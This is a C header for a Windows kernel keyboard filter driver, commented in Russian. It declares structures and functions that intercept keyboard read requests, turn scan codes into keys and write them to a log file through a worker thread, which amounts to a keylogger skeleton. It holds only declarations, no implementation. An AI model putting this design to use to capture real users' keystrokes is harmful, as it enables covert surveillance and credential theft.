#include <ntddk.h>
#include <ntddkbd.h>

//Содержит информацию о текущей клавише
typedef struct 
{
	LIST_ENTRY listNode;
	char keyData;
	char keyFlags;
} KEY_DATA;


typedef struct _DEVICE_EXTENSION
{
	PDEVICE_OBJECT pKeyboardDevice;
	PETHREAD pThreadObj;
	BOOLEAN bClosedThread;
	HANDLE hLog;
	BOOLEAN shift;
	KSEMAPHORE semaphore;
	KSPIN_LOCK spinlock;
	LIST_ENTRY listHead;
} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

//Процедура завершения обработки IRP-пакета
NTSTATUS ReadCompleted(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context);

//Обработчик всех IRP пакетов, кроме IRP_MJ_READ
NTSTATUS DispatchSkip(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);

//Обработчик пакетов IRP_MJ_READ
NTSTATUS DispatchRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);

//Установка устройства в стек
NTSTATUS InitializeKeyboardFilter(PDRIVER_OBJECT pDriverObject);

//Поток для записи в файл
VOID ThreadForWriting(PVOID pContext);

//Функция инициализации потока
NTSTATUS InitializeThread(PDRIVER_OBJECT pDriverObject);

//Создание списка и файла для записи
NTSTATUS CreateListAndFile(PDRIVER_OBJECT pDriverObject);

//Преобразование скан-кодов в клавиши
char* Scancode2Key(PDEVICE_EXTENSION pDeviceExtension, KEY_DATA* kData, char* keys);

//Входная точка
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath);

//Функция выгрузки драйвера
VOID Unload(PDRIVER_OBJECT pDriverObject);